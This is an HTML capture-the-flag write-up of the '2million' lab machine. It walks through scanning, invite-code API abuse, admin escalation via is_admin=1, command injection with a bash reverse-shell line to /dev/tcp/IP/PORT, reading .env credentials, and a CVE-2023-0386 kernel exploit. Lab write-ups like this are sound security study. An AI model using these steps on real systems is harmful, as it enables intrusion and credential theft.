@@ -1,0 +1,168 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8"> 
+  <title>2million</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+  <div class="page">
+    <h1 class="title">2million</h1>
+
+    <section>
+      <h2>Initial Reconnaissance</h2>
+      <p>
+        I begin by performing a full network scan against the target machine in order to identify
+        open ports, running services, and potential attack vectors.
+      </p>
+      
+      <pre><code>nmap 10.10.11.221 -Pn -sC -sV -O -oN scan_full.txt</code></pre>
+
+      <p>
+        Once the scan is completed, I add the discovered domain to the <code>/etc/hosts</code> file
+        to properly resolve the hostname during further enumeration.
+      </p>
+    </section>
+
+    <section>
+      <h2>Directory Enumeration</h2>
+      <p>
+        Next, I perform directory enumeration using <strong>Gobuster</strong> to identify hidden
+        endpoints and resources.
+      </p>
+
+      <pre><code>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://2million.htb -b 301</code></pre>
+
+      <p>
+        This scan reveals two interesting directories:
+        <span class="highlight">/invite</span> and <span class="highlight">/login</span>.
+      </p>
+    </section>
+
+    <section>
+      <h2>Invite Code Analysis</h2>
+      <p>
+        Inside the <code>/invite</code> directory, I discover a reference to an obfuscated JavaScript
+        file named <code>inviteapi.min.js</code>.
+      </p>
+
+      <p>
+        After deobfuscating the script using
+        <a href="https://lelinhtinh.github.io/de4js/" target="_blank">De4JS</a>,
+        I uncover two important API endpoints:
+      </p>
+
+      <ul>
+        <li><code>/api/v1/invite/verify</code></li>
+        <li><code>/api/v1/invite/how/to/generate</code></li>
+      </ul>
+
+      <p>
+        Using Burp Suite, I send a <strong>POST</strong> request and analyze the server response.
+        The data appears to be encrypted using <strong>ROT13</strong>.
+      </p>
+
+      <img src="images/10-1.png" alt="ROT13 response">
+
+      <p>
+        After decrypting the message, it instructs me to send a POST request to
+        <code>/api/v1/invite/generate</code> in order to obtain an invite code.
+      </p>
+
+      <img src="images/10-2.png" alt="Invite code">
+
+      <p>
+        The returned invite code is Base64 encoded, so I decode it using the following command:
+      </p>
+
+      <pre><code>echo "NlJXOEktMlhOTlAtUFpOSkwtVFlaR04=" | base64 -d</code></pre>
+
+      <p>
+        With this decoded invite code, I am able to register a new user, confirming that
+        user creation is restricted to invite-based registrations.
+      </p>
+    </section>
+
+    <section>
+      <h2>Authentication & VPN Access</h2>
+      <p>
+        After registering, I log in and gain access to the <code>/home</code> dashboard.
+        The <code>/access</code> page allows users to download VPN configuration files.
+      </p>
+
+      <p>
+        By intercepting the download request with Burp Suite, I confirm that the file is
+        an <strong>OpenVPN</strong> configuration.
+      </p>
+
+      <p>
+        Further API enumeration of <code>/api/v1</code> reveals administrative authentication endpoints.
+      </p>
+
+      <img src="images/10-4.png" alt="Admin API">
+
+      <p>
+        I attempt a <strong>PUT</strong> request to
+        <code>/api/v1/admin/settings/update</code>, which initially fails due to missing
+        JSON headers and required parameters.
+      </p>
+
+      <img src="images/10-6.png" alt="Missing parameters">
+
+      <p>
+        After setting <code>is_admin=1</code>, the request succeeds, and I confirm that I now have
+        administrative privileges.
+      </p>
+    </section>
+
+    <section>
+      <h2>Command Injection & Reverse Shell</h2>
+      <p>
+        While generating a VPN configuration from <code>/vpn/generate</code>, I notice that user
+        input is processed by PHP functions without proper sanitization.
+      </p>
+
+      <p>
+        This allows me to successfully exploit a command injection vulnerability.
+        I inject a Base64-encoded reverse shell payload:
+      </p>
+
+      <pre><code>bash -i >& /dev/tcp/IP/PORT 0>&1</code></pre>
+
+      <img src="images/10-12.png" alt="Reverse shell">
+
+      <p>
+        Once the shell is established, I discover the <strong>admin</strong> user and retrieve
+        the <code>user.txt</code> flag.
+      </p>
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        During post-exploitation, I find a hidden <code>.env</code> file containing database
+        credentials for the admin user.
+      </p>
+
+      <pre><code>ls -al
+cat .env</code></pre>
+
+      <p>
+        Using these credentials, I successfully log in via SSH.
+      </p>
+
+      <p>
+        After further enumeration, I discover an email referencing a vulnerable kernel version.
+        Running <code>uname -a</code> confirms that the system is vulnerable to
+        <a href="https://github.com/xkaneiki/CVE-2023-0386" target="_blank">CVE-2023-0386</a>.
+      </p>
+
+      <p>
+        I clone the exploit, transfer it to the target machine, follow the PoC steps,
+        and achieve full privilege escalation.
+      </p>
+    </section>
+  </div>
+</body>
+</html>
